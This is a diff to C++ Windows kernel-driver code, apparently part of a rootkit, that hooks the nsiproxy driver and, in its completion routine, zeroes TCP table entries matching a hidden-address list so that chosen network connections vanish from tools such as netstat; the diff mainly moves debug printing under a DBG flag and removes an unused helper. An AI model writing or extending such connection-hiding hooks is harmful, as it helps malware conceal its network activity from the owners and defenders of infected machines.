@@ -4,14 +4,6 @@
 PDRIVER_OBJECT NsiHook::g_NetNSIProxyDriverObject = nullptr;
 PDRIVER_DISPATCH NsiHook::g_NetOldNSIProxyDeviceControl = nullptr;
 
-USHORT NsiHook::htons(USHORT a)
-{
-	USHORT b = a;
-	b = (b << 8);
-	a = (a >> 8);
-	return (a | b);
-}
-
 NTSTATUS NsiHook::NetHookNSIProxy()
 {
 	UNICODE_STRING NsiDriverName = RTL_CONSTANT_STRING(L"\\Driver\\nsiproxy");
@@ -73,6 +65,7 @@ BOOLEAN NsiHook::NetNSIFreeHook()
 	return FALSE;
 }
 
+#if DBG
 static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP, USHORT foreignPort, ULONG cforeignIP)
 {
 	union
@@ -110,6 +103,7 @@ static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP, US
 	cforeignbytes[3] = (cforeignIP >> 24) & 0xFF;
 	DbgPrint("%d.%d.%d.%d\n", cforeignbytes[0], cforeignbytes[1], cforeignbytes[2], cforeignbytes[3]);
 }
+#endif
 
 NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
 	IN PDEVICE_OBJECT DeviceObject,
@@ -137,21 +131,22 @@ NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
 	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);
 
 	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiStructure1->Entries;
+#if DBG
 	PNSI_STRUCTURE_ENTRY NsiBufferEntries = &(NsiStructure1->Entries->EntriesStart[0]);
+#endif 
 
 	for (ULONG i = 0; i < NsiStructure1->NumberOfEntries; i++)
 	{
-		// PrintIP(NsiBufferEntries[i].IpAddress);
+#if DBG
 		PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP, pTcpEntry->remoteEntry.Port,
 			NsiBufferEntries[i].IpAddress);
+#endif
 
-		// if (NetHook::NetIsHiddenIpAddress(NsiBufferEntries[i].IpAddress)
 		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
 			pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP))
 		{
-			RtlZeroMemory(&NsiBufferEntries[i], sizeof(NSI_STRUCTURE_ENTRY));
 			RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
 		}
 	}
